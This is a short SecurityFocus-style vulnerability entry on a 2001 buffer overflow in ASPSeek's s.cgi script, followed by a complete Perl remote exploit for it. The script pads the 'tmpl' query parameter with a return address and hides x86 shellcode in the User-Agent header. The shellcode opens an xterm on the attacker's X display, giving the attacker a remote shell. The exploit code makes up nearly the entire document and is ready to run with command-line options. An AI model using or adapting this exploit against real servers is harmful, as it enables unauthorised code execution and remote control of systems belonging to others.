source: http://www.securityfocus.com/bid/2492/info

A buffer overflow in ASPSeek versions 1.0.0 through to 1.0.3 allows for arbitrary code execution with the privileges of the web server. The vulnerable script is s.cgi and the buffer overflow can be accessed by submitting an excessively long query string to the script (the variable tmpl, specifically). 

#!/usr/bin/perl

# | Remote buffer overflow exploit for ASPSeek, SWSoft
# | Copyright (c) 2001 by <teleh0r@doglover.com>
# | All rights reserved.
# |
# | Usage: $0 -t target -a attacker -d dpy -o offset
# | Credits to NeilK who discovered the vulnerability!

use Getopt::Std; getopts('t:a:d:o:', \%args);
use Socket;

if (defined($args{'t'})) { $target   = $args{'t'}; }
if (defined($args{'a'})) { $attacker = $args{'a'}; }
if (defined($args{'d'})) { $dpy      = $args{'d'}; }
if (defined($args{'o'})) { $offset   = $args{'o'}; }

$shellcode = # RaiSe <raise@undersec.com>
"\xeb\x4f\x5e\x31\xd2\x88\x56\x14\x88\x56\x18\x88\x56".
"\x21\xb2\x2b\x31\xc9\xb1\x09\x80\x3c\x32\x4b\x74\x05".
"\x42\xe2\xf7\xeb\x2b\x88\x34\x32\x31\xd2\x89\xf3\x89".
"\x76\x36\x8d\x7e\x15\x89\x7e\x3a\x8d\x7e\x19\x89\x7e".
"\x3e\x8d\x7e\x22\x89\x7e\x42\x89\x56\x46\x8d\x4e\x36".
"\x8d\x56\x46\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\x89\xd8".
"\x40\xcd\x80\xe8\xac\xff\xff\xff/usr/X11R6/bin/xterm".
"8-ut8-display8${attacker}:${dpy}K";

# Remember to allow $target to connect to your X by 
# using xhost + $target.

$return = 0xbfffd1a4;
$length = 5200;
$egglen = 4500;

if (!(defined($target && $attacker && $dpy))) {
    die("Error: $0 -t \"target\" -a \"attacker\" -d \"dpy\"\n");
}

print("Address: 0x", sprintf('%lx', ($return + $offset)), "\n");
$new_ret = pack('l', ($return + $offset));

for ($i = 0; $i < $length; $i += 4) {
    $buffer .= $new_ret;
}

for ($i = 0; $i < ($egglen - length($shellcode)); $i++) {
    $egg .= 'A';
}

$egg .= $shellcode;

$exploit =
"GET /./cgi-bin/./s.cgi?q=a&tmpl=$buffer HTTP/1.1
Host: $target
Referer: http://teleh0r.cjb.net/
User-Agent: $egg
Accept: */*
Accept-Language: en
Accept-Encoding: gzip, deflate, compress, identity
Content-Type: application/x-www-form-urlencoded";

$iaddr = inet_aton($target)                  || die("Error: $!\n");
$paddr = sockaddr_in(80, $iaddr)             || die("Error: $!\n");
$proto = getprotobyname('tcp')               || die("Error: $!\n");

socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(SOCKET, $paddr)                      || die("Error: $!\n");
send(SOCKET,"$exploit\015\012", 0)           || die("Error: $!\n");
close(SOCKET);

# Tested on Redhat 6.2 - aspseek-1.0.3 - Tue Mar 20 18:09:44 2001
